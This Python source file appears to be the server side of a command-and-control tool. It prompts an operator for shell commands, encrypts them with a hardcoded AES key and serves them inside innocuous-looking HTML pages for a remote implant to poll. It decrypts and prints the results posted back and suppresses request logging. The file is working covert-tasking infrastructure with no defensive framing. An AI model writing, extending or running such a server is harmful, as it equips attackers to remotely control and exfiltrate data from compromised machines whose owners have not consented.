import pyaes
import base64
from http.server import BaseHTTPRequestHandler, HTTPServer
import sys
key = b"This_key_for_demo_purposes_only!"
def encrypt(data):
    aes = pyaes.AESModeOfOperationCTR(key)
    ciphertext = aes.encrypt(data.encode('utf-8'))
    return base64.b64encode(ciphertext).decode()
def decrypt(data):
    aes = pyaes.AESModeOfOperationCTR(key)
    decoded_data = base64.b64decode(data)
    return aes.decrypt(decoded_data).decode('utf-8')
class CommandHandler(BaseHTTPRequestHandler):
    def _set_response_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
    def do_GET(self):
        self._set_response_headers()
        command = input('Enter command: ')
        encrypted_command = encrypt(command)
        html_response = f"<html><body><h1>{encrypted_command}</h1></body></html>"
        self.wfile.write(html_response.encode('utf-8'))
    def do_POST(self):
        self._set_response_headers()
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        decrypted_data = decrypt(post_data)
        print(f"Decrypted command: {decrypted_data}")
    def log_message(self, format, *args):
        pass
def run_server(port=8880):
    server_address = ('', port)
    httpd = HTTPServer(server_address, CommandHandler)
    print(f"Starting HTTP server on port {port}...")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\nShutting down the server...")
        httpd.server_close()
if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8880
    run_server(port)